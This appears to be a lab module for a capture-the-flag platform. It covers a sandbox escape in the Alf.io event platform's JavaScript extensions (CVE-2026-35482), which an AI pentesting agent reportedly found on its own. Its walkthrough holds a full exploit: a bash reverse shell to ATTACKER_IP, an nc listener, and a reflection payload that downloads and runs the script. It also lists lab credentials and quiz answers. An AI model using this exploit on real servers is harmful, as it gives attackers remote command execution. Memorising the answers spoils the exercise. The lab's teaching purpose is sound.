---

title: noscope-finding-rce 
tags:
  - module
  - rce
  - java
  - sandbox-escape
  - cve
  - reverse-shell
---

![[assets/noscope-finding-rce-header.png]]

## Introduction

[Alf.io](https://alf.io) is an open-source Java/Spring Boot event management platform used by conference organizers, sports clubs, and ticketing services. It ships with an extension system that lets administrators run custom JavaScript in response to platform events like ticket assignments and invoice generation.

To isolate those scripts from the JVM, Alf.io runs them in a JavaScript sandbox backed by Mozilla Rhino. Scripts are validated against a blocklist before execution, so patterns like `java.lang.Runtime` and reflection keywords get rejected. The assumption is simple: a script that cannot name a dangerous class cannot reach one.

CVE-2026-35482 breaks that assumption. Alf.io injects a variable called `returnClass` into every script scope, a raw Java `Class<T>` object meant as a convenience for scripts that declare their return type. `Class<T>` exposes `Class.forName()`, so an attacker can load any JVM class by passing its name as a string. The blocklist never inspects that string. From there, Java reflection reaches `Runtime.exec()` and arbitrary OS command execution.

The finding was produced autonomously by NoScope, which mapped the attack surface, identified the `returnClass` binding, and confirmed it end to end without reading the source.

## What is NoScope?

[NoScope](https://www.noscope.com/) is an AI-based automated pentesting platform. It deploys agents that map an application's attack surface, build an attack graph, generate targeted payloads, and confirm exploitability before surfacing a finding. Nothing gets flagged unless it is proven.

## Running NoScope

![[assets/noscope-finding-rce1.png]]

Start the machine, run NoScope against it, and read the findings.

> [!question]- What sandboxing engine did NoScope identify as the one in use? Mozilla Rhino

> [!question]- What was the flag value NoScope retrieved out of the flag.txt file during its engagement? `THM-{ALF_CV3_PWN}`

## Weaponizing the CVE

Target: `Alf.io 2.0-M5-2509-1`, vulnerable to CVE-2026-35482. Admin panel: `http://MACHINE_IP/admin` Credentials: `admin:Password1!` An event is already set up.

### Getting a Reverse Shell

**Step 1: Prepare the reverse shell**

On the AttackBox, create `rev.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
```

Serve it over HTTP:

```bash
python -m http.server 80
```

Start a listener in another terminal:

```bash
nc -lvnp 4444
```

**Step 2: Build the payload**

The extension script uses `returnClass.forName()` to load `java.lang.Runtime` by name, bypassing the blocklist. `Runtime.exec(String)` does not expand shell metacharacters, so the payload downloads the script, sets permissions, and runs it.

```javascript
function getScriptMetadata() {
	return {
		id: 'rce-validate',
		displayName: 'RCE Validate',
		version: 0,
		async: false,
		events: ['EVENT_STATUS_CHANGE']
	};
}

function executeScript(scriptEvent) {
	var rtClass = returnClass.forName('java.lang.Runtime');
	var strClass = returnClass.forName('java.lang.String');
	var runtime = rtClass.getMethod('getRuntime').invoke(null);
	var proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'wget http://ATTACKER_IP/rev.sh -O /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'chmod 777 /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, '/home/alfio/rev.sh');
	var bytes = proc.getInputStream().readAllBytes();

	var output = '';
	for (var i = 0; i < bytes.length; i++) {
		output += String.fromCharCode(bytes[i] & 0xFF);
	}

	console.log(output);
	return { invoiceNumber: output };
}
```

**Step 3: Register the extension**

Log into `http://MACHINE_IP/admin` and go to **Extension → add new**. Add a path at the top (e.g. `System/rev`), paste the payload, and save.

**Step 4: Trigger the extension**

The payload listens for `EVENT_STATUS_CHANGE`, which fires every time an event is published or hidden. Go to **Events**, click **Load expired events** to reach the **TryHackMe** event, and click **Publish now**. The extension fires immediately.

To retrigger after a mistake, hide the event: go to **Logistic info and description → Edit**, set **Event Date** to a future date, **Save**, then **Actions → hide from list**.

> [!success] Shell obtained The listener catches the reverse shell within a few seconds.

## Conclusion

Full chain from vulnerability identification to shell access: identify the Rhino sandbox, break out through the `returnClass` binding, and land a reverse shell. Setting up the trigger also means NoScope can retest automatically on every deploy or CVE drop, which is how continuous pentesting works in practice.
